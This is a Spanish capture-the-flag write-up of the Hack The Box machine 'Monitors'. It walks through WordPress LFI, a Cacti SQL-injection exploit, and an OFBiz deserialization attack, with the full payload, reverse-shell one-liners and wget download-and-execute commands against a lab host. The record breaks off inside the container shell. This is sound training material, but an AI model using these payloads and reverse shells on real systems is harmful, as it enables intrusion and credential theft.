---
layout: single
title: Monitors - Hack The Box
excerpt: "'Monitors' es una máquina Linux de alta dificultad que involucra la explotación de un plugin de WordPress, lo que lleva a una inyección de comandos a través de una inyección SQL a través de una conocida aplicación web de gestión de redes. Esto permite obtener una shell en el sistema. Luego, realizando una enumeración básica de archivos de servicios, es posible obtener la contraseña de usuario y, por lo tanto, un punto de apoyo para acceder al sistema a través de SSH. La fase de root implica un ataque de deserialización basado en XML RPC en Apache OFBiz para obtener una shell en un contenedor Docker. Luego, es posible abusar de la capacidad CAP_SYS_MODULE para cargar un módulo del kernel malicioso en el host y escalar privilegios a root."
date: 2023-10-10
classes: wide
header:
  teaser: /assets/images/htb-writeup-monitors/monitors_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - web
  - vulnerability assesment
tags:
  - SQL Injection 
  - Local File Inclusion 
  - OS Command Injection
  - Deserialization
  - Information Disclosure 
  - Misconfiguration 
---
![](/assets/images/htb-writeup-monitors/monitors_logo.png)

"Monitors" es una máquina Linux de alta dificultad que involucra la explotación de un plugin de WordPress, lo que lleva a una inyección de comandos a través de una inyección SQL a través de una conocida aplicación web de gestión de redes. Esto permite obtener una shell en el sistema. Luego, realizando una enumeración básica de archivos de servicios, es posible obtener la contraseña de usuario y, por lo tanto, un punto de apoyo para acceder al sistema a través de SSH. La fase de root implica un ataque de deserialización basado en XML RPC en Apache OFBiz para obtener una shell en un contenedor Docker. Luego, es posible abusar de la capacidad CAP_SYS_MODULE para cargar un módulo del kernel malicioso en el host y escalar privilegios a root.


## <span style="color: yellow;">Enumeración</span>

#### <span style="color: gray;">Nmap</span>
```
┌─[ot3ro@parrot]─[~/HTB/Monitors]
└──╼ $sudo nmap -A 10.10.10.238 -p- --open -Pn -n -v -oN nmap-A-monitors


PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bacccd81fc9155f3f6a91f4ee8bee52e (RSA)
|   256 6943376a1809f5e77a67b81811ead765 (ECDSA)
|_  256 5d5e3f67ef7d762315114b53f8413a94 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).

Uptime guess: 16.271 days (since Sun Sep 24 13:00:34 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=254 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Nmap nos muestra el puerto 22/tcp que ejecuta el servicio SSH con la versión "OpenSSH 7.6p1 Ubuntu 4ubuntu0.3" en un sistema Ubuntu Linux y el puerto 80/tcp que ejecuta un servidor web Apache httpd 2.4.29 en Ubuntu.

![](/assets/images/htb-writeup-monitors/noAccessSite.png)

El mensaje "Sorry, direct IP access is not allowed" indica que el acceso directo al sitio web no está permitido. En su lugar, se espera que los usuarios utilicen un nombre de dominio. Por lo tanto, vamos a proceder a agregar la entrada del dominio 'monitors.htb' en el archivo '/etc/hosts
```
10.10.10.238 monitors.htb
```
#### <span style="color: gray;">Nmap</span>
```
┌─[ot3ro@parrot]─[~/HTB/Monitors]
└──╼ $whatweb http://monitors.htb/ -v -a 3


WhatWeb report for http://monitors.htb/
Status    : 200 OK
Title     : Welcome to Monitor &#8211; Taking hardware monitoring seriously
IP        : 10.10.10.238
Country   : RESERVED, ZZ

Summary   : Apache[2.4.29], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], JQuery, MetaGenerator[WordPress 5.5.1], Script[text/javascript], UncommonHeaders[link], WordPress[5.5.1]

Detected Plugins:
[ Apache ]
	The Apache HTTP Server Project is an effort to develop and 
	maintain an open-source HTTP server for modern operating 
	systems including UNIX and Windows NT. The goal of this 
	project is to provide a secure, efficient and extensible 
	server that provides HTTP services in sync with the current 
	HTTP standards. 

	Version      : 2.4.29 (from HTTP Server Header)
	Google Dorks: (3)
	Website     : http://httpd.apache.org/

[ HTML5 ]
	HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
	HTTP server header string. This plugin also attempts to 
	identify the operating system from the server header. 

	OS           : Ubuntu Linux
	String       : Apache/2.4.29 (Ubuntu) (from server string)

[ JQuery ]
	A fast, concise, JavaScript that simplifies how to traverse 
	HTML documents, handle events, perform animations, and add 
	AJAX. 

	Website     : http://jquery.com/

[ MetaGenerator ]
	This plugin identifies meta generator tags and extracts its 
	value. 

	String       : WordPress 5.5.1

[ Script ]
	This plugin detects instances of script HTML elements and 
	returns the script language/type. 

	String       : text/javascript

[ UncommonHeaders ]
	Uncommon HTTP server headers. The blacklist includes all 
	the standard headers and many non standard but common ones. 
	Interesting but fairly common headers should have their own 
	plugins, eg. x-powered-by, server and x-aspnet-version. 
	Info about headers can be found at www.http-stats.com 

	String       : link (from headers)

[ WordPress ]
	WordPress is an opensource blogging system commonly used as 
	a CMS. 

	Version      : 5.5.1
	Aggressive function available (check plugin file or details).
	Google Dorks: (1)
	Website     : http://www.wordpress.org/

HTTP Headers:
	HTTP/1.1 200 OK
	Date: Wed, 11 Oct 2023 02:28:39 GMT
	Server: Apache/2.4.29 (Ubuntu)
	Link: <http://monitors.htb/index.php/wp-json/>; rel="https://api.w.org/"
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 4113
	Connection: close
	Content-Type: text/html; charset=UTF-8
```
### <span style="color: orange;">Wordpress</span>
![](/assets/images/htb-writeup-monitors/site.png)

Como podemos ver se está utilizando WordPress versión 5.5.1 como CMS para el sitio web.

```
┌─[✗]─[ot3ro@parrot]─[~/HTB/Monitors]
└──╼ $wpscan --url http://monitors.htb/

...[SNIP]...

[i] Plugin(s) Identified:

[+] wp-with-spritz
 | Location: http://monitors.htb/wp-content/plugins/wp-with-spritz/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2015-08-20T20:15:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 4.2.4 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt

```
WPScan nos lista un plugin llamado 'wp-with-spritz' y la ubicación de los archivos en "http://monitors.htb/wp-content/plugins/wp-with-spritz/"

![](/assets/images/htb-writeup-monitors/wp-spritz.png)

Al buscar en la web podemos encontrar un exploit relacionado con el plugin 'wp-with-spritz'

[WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion](https://www.exploit-db.com/exploits/44544){:target="_blank"}
![](/assets/images/htb-writeup-monitors/poc.png)

Al aplicar la técnica 'LFI' según se muestra en el exploit, logramos extraer el archivo '/etc/passwd'

![](/assets/images/htb-writeup-monitors/lfi.png)

En la mayoría de las instalaciones de Apache, el archivo de configuración del virtual host predeterminado se llama "000-default.conf" o "default.conf" y suele ubicarse en el directorio de configuración del servidor web, como "/etc/apache2/sites-available/" en sistemas Linux.

#### <span style="color: gray;">"url=/../../../..//etc/apache2/sites-enabled/000-default.conf":</span>
![](/assets/images/htb-writeup-monitors/sites_enabled.png)

Los comentarios indican que existen otros archivos de configuración llamados "monitors.htb.conf" y "cacti-admin.monitors.htb.conf" que están relacionados con la configuración del host virtual que se muestra en este archivo.

#### <span style="color: gray;">"url=/../../../../../..//etc/apache2/sites-enabled/monitors.htb.conf":</span>
![](/assets/images/htb-writeup-monitors/monitorsConf.png)

El archivo de configuración 'monitors.htb.conf' nos muestra la ubicación del directorio principal de "Wordpress"

Podemos examinar el archivo "wp-config.php" , que es un archivo de configuración fundamental en WordPress, este archivo contiene información sensible relacionada con la base de datos y otros ajustes esenciales

#### <span style="color: gray;">"url=/../../../..//var/www/wordpress/wp-config.php":</span>
![](/assets/images/htb-writeup-monitors/wp-config.png)

obtenemos un error al intentar iniciar sessión en wordpress con las credenciales encontradas en el archivo 'wp-config.php'

![](/assets/images/htb-writeup-monitors/incorret_login.png)


Anteriormente identificamos el virtual host 'cacti-admin.monitors.htb' en el archivo 'cacti-admin.monitors.htb.conf'
#### <span style="color: gray;">url=/../../../..//etc/apache2/sites-enabled/cacti-admin.monitors.htb.conf</span>
![](/assets/images/htb-writeup-monitors/lfi-cacti-admin.png)

el servidor virtual (vhost) para "cacti-admin.monitors.htb" parece estar activo y configurado. 

Registramos el vhost en el archivo /etc/hosts:


```
10.10.10.238 monitors.htb cacti-admin.monitors.htb
```
### <span style="color: green;">Cacti</span>

![](/assets/images/htb-writeup-monitors/cacti-admin.png)

Al dirigirnos al subdominio 'http://cacti-admin.monitors.htb/' se nos presenta un panel de autenticación correspondiente a la versión 1.2.12 de 'Cacti'
><p style="font-size: 16px;">"Cacti es una plataforma de monitoreo de red y gestión de fallas de código abierto que permite a los usuarios supervisar y administrar dispositivos de red"</p>


En el panel de autenticación en el sitio de 'Cacti' logramos autenticarnos con las credenciales "admin:BestAdministrator@2020!" que encontramos en el archivo 'wp-config.php' 

![](/assets/images/htb-writeup-monitors/cacti.png)

La versión 1.2.12 de la aplicación Cacti presenta una vulnerabilidad crítica de 'Inyección SQL', que habilita la ejecución de código remoto no autorizado. 
```
┌─[ot3ro@parrot]─[~/HTB/Monitors]
└──╼ $searchsploit cacti
---------------------------------------- ---------------------------------
 Exploit Title                          |  Path
---------------------------------------- ---------------------------------
Cacti 1.2.12 - 'filter' SQL Injection   | php/webapps/49810.py
```

```python
# Exploit Title: Cacti 1.2.12 - 'filter' SQL Injection / Remote Code Execution
# Date: 04/28/2021
# Exploit Author: Leonardo Paiva
# Vendor Homepage: https://www.cacti.net/
# Software Link: https://www.cacti.net/downloads/cacti-1.2.12.tar.gz
# Version: 1.2.12
# Tested on: Ubuntu 20.04
# CVE : CVE-2020-14295
# Credits: @M4yFly (https://twitter.com/M4yFly)
# References:
# https://github.commandcom/Cacti/cacti/issues/3622
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14295

#!/usr/bin/python3

import argparse
import requests
import sys
import urllib.parse
from bs4 import BeautifulSoup

# proxies = {'http': 'http://127.0.0.1:8080'}


...[SNIP]...

def exploit(lhost, lport, session):
    rshell = urllib.parse.quote(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f")
    payload = f"')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='{rshell};'+where+name='path_php_binary';--+-"

    exploit_request = session.get(url + f"/cacti/color.php?action=export&header=false&filter=1{payload}") #, proxies=proxies)

    print("\n[+] SQL Injection:")
    print(exploit_request.text)

    try:
        session.get(url + "/cacti/host.php?action=reindex", timeout=1) #, proxies=proxies)

...[SNIP]...
```
[exploit](https://www.exploit-db.com/exploits/51166){:target="_blank"}

Este exploit inyecta una consulta SQL maliciosa en una solicitud HTTP a la aplicación Cacti. La consulta intenta robar credenciales de usuario y, al mismo tiempo, establece un acceso remoto al sistema objetivo a través de un túnel inverso.
```
┌─[✗]─[ot3ro@parrot]─[~/HTB/Monitors]
└──╼ $python3 49810.py -t http://cacti-admin.monitors.htb -u admin -p 'BestAdministrator@2020!' --lhost 10.10.14.9 --lport 443

[+] Connecting to the server...
[+] Retrieving CSRF token...
[+] Got CSRF token: sid:761c0a24c7d3341c961ba95fdfdde6c2bb3c9305,1697155640
[+] Trying to log in...
[+] Successfully logged in!

[+] SQL Injection:
"name","hex"
"",""
"admin","$2y$10$TycpbAes3hYvzsbRxUEbc.dTqT0MdgVipJNBYu8b7rUlmB8zn8JwK"
"guest","43e9a4ab75570f5b"

[+] Check your nc listener!

```
```
┌─[✗]─[ot3ro@parrot]─[~]
└──╼ $sudo nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.238] 52014
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ pwd
/usr/share/cacti/cacti
$ 

```

Otra forma de obtener una revershell sería a través de Burp Suite, aplicando manualmente la misma lógica que utiliza el script. Esto implica aprovechar la ejecución de código en el parámetro 'filter' de la sección 'color' en el panel de Cacti.

![](/assets/images/htb-writeup-monitors/cacti-colors.png)

![](/assets/images/htb-writeup-monitors/payload_burpsuite.png)

Luego hacemos una reindexación al dirigirnos a "http://cacti-admin.monitors.htb/cacti/host.php?action=reindex" para que se actualice nuestro código y se ejecute, como se especifica en el exploit.
![](/assets/images/htb-writeup-monitors/action_reindex.png)


```
┌─[ot3ro@parrot]─[~/HTB/Monitors]
└──╼ $sudo nc -lnvp 9001

listening on [any] 9001 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.238] 33190
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ uname -a
Linux monitors 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```
## <span style="color: yellow;">Escalada de privilegios a marcus</span>


```
www-data@monitors:/etc/systemd/system$ cd /home/
www-data@monitors:/home$ ls
marcus
www-data@monitors:/home$ cd marcus/
www-data@monitors:/home/marcus$ ls -al

d--x--x--x 2 marcus marcus 4096 Nov 10  2020 .backup
lrwxrwxrwx 1 root   root      9 Nov 10  2020 .bash_history -> /dev/null
-rw-r--r-- 1 marcus marcus  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 marcus marcus 3771 Apr  4  2018 .bashrc
drwx------ 2 marcus marcus 4096 Jan 25  2021 .cache
drwx------ 3 marcus marcus 4096 Nov 10  2020 .gnupg
-rw-r--r-- 1 marcus marcus  807 Apr  4  2018 .profile
-r--r----- 1 root   marcus   84 Jan 25  2021 note.txt
-r--r----- 1 root   marcus   33 Oct 13 02:32 user.txt
www-data@monitors:/home/marcus$ cat user.txt 
cat: user.txt: Permission denied
www-data@monitors:/home/marcus$ cat note.txt 
cat: note.txt: Permission denied
www-data@monitors:/home/marcus$ cd .backup/
www-data@monitors:/home/marcus/.backup$ ls -al
ls: cannot open directory '.': Permission denied
www-data@monitors:/home/marcus/.backup$ cd ..
```
Intentamos enumerar los archivos en el directorio del usuario 'marcus', pero se nos deniega el permiso. 

```
www-data@monitors:/home/marcus$ find / -type f -name "*cacti*" 2>/dev/null 

...[SNIP]...

/lib/systemd/system/cacti-backup.service

...[SNIP]...

```

Luego de enumerar el sistema, encontramos un archivo de unidad de systemd que define un servicio llamado "cacti-backup"
```
www-data@monitors:/home/marcus$ cat /lib/systemd/system/cacti-backup.service

[Unit]
Description=Cacti Backup Service
After=network.target

[Service]
Type=oneshot
User=www-data
ExecStart=/home/marcus/.backup/backup.sh

[Install]
WantedBy=multi-user.target
```
Este archivo de unidad de systemd configura un servicio llamado "Cacti Backup Service" que se inicia después de que se haya establecido la red. El servicio se ejecuta una vez, utiliza el usuario "www-data" y ejecuta el script de respaldo "/home/marcus/.backup/backup.sh

```
www-data@monitors:/home/marcus$ cat .backup/backup.sh

#!/bin/bash

backup_name="cacti_backup"
config_pass="VerticalEdge2020"

zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
sshpass -p "${config_pass}" scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
rm /tmp/${backup_name}.zip

```
El script 'backup.sh' se encarga de empaquetar los archivos de Cacti en un archivo ZIP, copiar ese archivo a un servidor remoto utilizando SSH con contraseña, y luego eliminar el archivo ZIP temporal en el sistema local

La contraseña  "VerticalEdge2020" nos permite iniciar sesión en el sistema como el usuario marcus.

```bash
www-data@monitors:/home/marcus$ ssh marcus@10.10.10.238
marcus@10.10.10.238's password: 
marcus@monitors:~$ 
marcus@monitors:~$ whoami
marcus
marcus@monitors:~$ cat user.txt
 
160f5466f4f83a195b97e563da59874e
```
## <span style="color: yellow;">Escalada de privilegios a root</span>


Continuando con la enumeración , localizamos un servicio web que usa el puerto 8443
```
marcus@monitors:~$ ss -tln
State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*       
LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*       
LISTEN   0         128               127.0.0.1:8443             0.0.0.0:*       
LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*       
LISTEN   0         128                       *:80                     *:*       
LISTEN   0         128                    [::]:22                  [::]:*

```
Vamos a configurar un reenvío del puerto('Port forwarding') 8443 de la máquina remota para que podamos acceder a el servicio en nuestra propia máquina local a través de dicho puerto.

```
┌─[✗]─[ot3ro@parrot]─[~/HTB/Monitors]
└──╼ $ssh marcus@10.10.10.238 -L 8443:localhost:8443

```
![](/assets/images/htb-writeup-monitors/notFound.png)

```
┌─[ot3ro@parrot]─[~/HTB/Monitors]
└──╼ $gobuster dir -u https://127.0.0.1:8443/ -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://127.0.0.1:8443/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/10/14 02:34:23 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 302) [Size: 0] [--> /images/]
/content              (Status: 302) [Size: 0] [--> /content/]
/common               (Status: 302) [Size: 0] [--> /common/] 
/catalog              (Status: 302) [Size: 0] [--> /catalog/]
/marketing            (Status: 302) [Size: 0] [--> /marketing/]
/ecommerce            (Status: 302) [Size: 0] [--> /ecommerce/]
/ap                   (Status: 302) [Size: 0] [--> /ap/]       
/ar                   (Status: 302) [Size: 0] [--> /ar/]       
/ebay                 (Status: 302) [Size: 0] [--> /ebay/]     
/manufacturing        (Status: 302) [Size: 0] [--> /manufacturing/]
/passport             (Status: 302) [Size: 0] [--> /passport/]     
/example              (Status: 302) [Size: 0] [--> /example/]      
/bi                   (Status: 302) [Size: 0] [--> /bi/]           
/accounting           (Status: 302) [Size: 0] [--> /accounting/]   
/webtools             (Status: 302) [Size: 0] [--> /webtools/] 
```

![](/assets/images/htb-writeup-monitors/registered_user.png)

Nos encontramos con un servicio llamado 'OFBiz' versión 17.12.01 corriendo en un servidor Apache

><p style="font-size: 16px;">Apache OFBiz (The Apache Open For Business Project) es un marco de aplicaciones empresariales de código abierto basado en Java y una suite de software que proporciona una plataforma para el desarrollo y la automatización de procesos empresariales</p>

### <span style="color: orange;">Exploit</span>

En Apache OFBiz, hay un punto de acceso XMLRPC en la dirección /webtools/control/xmlrpc. Para explotar la vulnerabilidad necesitamos hacer una petición POST a /webtools/control/xmlrpc y adjuntar un payload base64 a la entidad serializable dentro del archivo **XML** en la petición

```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>ProjectDiscovery</methodName>
  <params>
    <param>
      <value>
        <struct>
          <member>
            <name>test</name>
            <value>
              <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">[base64-payload]</serializable>
            </value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>
```
<span style="color: orange;">fuentes:</span> 
[ofbiz-CVE-2020-9496](https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2020-9496){:target="_blank"} ,
[javase-jre8-downloads.html](https://www.oracle.com/java/technologies/javase-jre8-downloads.html){:target="_blank"}

Para poder generar nuestros payloads, primero tenemos que descargarnos la herramienta [ysoserial-all.jar](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar)
><p style="font-size: 16px;">La herramienta ysoserial-all.jar contiene diferentes "gadgets" (fragmentos de código que pueden ser utilizados de manera maliciosa) que se aprovechan en ataques de deserialización. Un atacante puede utilizar esta herramienta para generar datos serializados maliciosos que, cuando se deserializan en una aplicación vulnerable, pueden llevar a la ejecución de código arbitrario en el sistema objetivo</p>


Luego nos crearemos un archivo llamado 'shell.sh' con nuestra reverse shell
```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.9/443 0>&1

```
Iniciamos un servidor HTTP para poner en servicio nuestro archivo 'shell.sh', generamos el primer payload en base64 y lo mandamos al servidor en una petición POST

><p style="font-size: 16px;">NOTA: puedes usar tanto Burpsuite como curl para mandar los payloads por POST</p>

```
┌─[ot3ro@parrot]─[~/HTB/Monitors]
└──╼ $java -jar ysoserial-all.jar CommonsBeanutils1 "wget http://10.10.14.9/shell.sh -O /tmp/shell.sh" | base64 | tr -d "\n"

rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABsTK/rq+AAAAMgA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAwd2dldCBodHRwOi8vMTAuMTAuMTQuOS9zaGVsbC5zaCAtTyAvdG1wL3NoZWxsLnNoCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAdeXNvc2VyaWFsL1B3bmVyMjgxNzQ1MDk4NTAzNzYBAB9MeXNvc2VyaWFsL1B3bmVyMjgxNzQ1MDk4NTAzNzY7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAALwAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAANAAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAOAAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJdXEAfgAQAAAB1Mr+ur4AAAAyABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADRm9vAQAMSW5uZXJDbGFzc2VzAQAlTHlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAGgEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgAAQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwASAAAAAgATAAAAAgAUABEAAAAKAAEAAgAWABAACXB0AARQd25ycHcBAHhxAH4ADXg=┌
```
Con el primer payload básicamente obligamos al servidor a descargar nuestro archivo 'shell.sh' y guardarlo en el directorio /tmp

![](/assets/images/htb-writeup-monitors/burpsuiteXml.png)

><p style="font-size: 16px;">El mismo procedimiento anterior aplica para cada uno de los payloads</p>

```
┌─[✗]─[ot3ro@parrot]─[~/HTB/Monitors]
└──╼ $sudo python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.238 - - [13/Oct/2023 04:24:00] "GET /shell.sh HTTP/1.1" 200 -

```
Con el sig. payload otorgamos permisos de ejecución a todos los usuarios sobre el archivo 'shell.sh'

```
┌─[ot3ro@parrot]─[~/HTB/Monitors]
└──╼ $java -jar ysoserial-all.jar CommonsBeanutils1 "chmod 777 /tmp/shell.sh" | base64 | tr -d "\n";echo

...[BASE64]...

```
Con el último payload vamos a ejecutar nuestro archivo 'shell.sh' y antes de mandarlo nos ponemos en escucha con 'Netcat' 
```bash
sudo nc -lnvp 443
```
```

┌─[ot3ro@parrot]─[~/HTB/Monitors]
└──╼ $java -jar ysoserial-all.jar CommonsBeanutils1 "bash -c /tmp/shell.sh" | base64 | tr -d "\n";echo


...[BASE64]...
```
```
┌─[ot3ro@parrot]─[~/HTB/Monitors]
└──╼ $sudo nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.238] 33774
bash: cannot set terminal process group (30): Inappropriate ioctl for device
bash: no job control in this shell
root@a3879984685b:/usr/src/apache-ofbiz-17.12.01# whoami
root
root@a3879984685b:/usr/src/apache-ofbiz-17.12.01# pwd
/usr/src/apache-ofbiz-17.12.01
root@a3879984685b:/usr/src/apache-ofbiz-17.12.01# uname -a
Linux a3879984685b 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 GNU/Linux
root@a3879984685b:/usr/src/apache-ofbiz-17.12.01# id
uid=0(root) gid=0(root) groups=0(root)
root@a3879984685b:/usr/src/apache-ofbiz-17.12.01# hostname
a3879984685b
root@a3879984685b:/usr/src/apache-ofbiz-17.12.01# df /
Filesystem     1K-blocks    Used Available Use% Mounted on
overlay         18445008 6453836  11786068  36% /
root@a3879984685b:/usr/src/apache-ofbiz-17.12.01# ps -eM
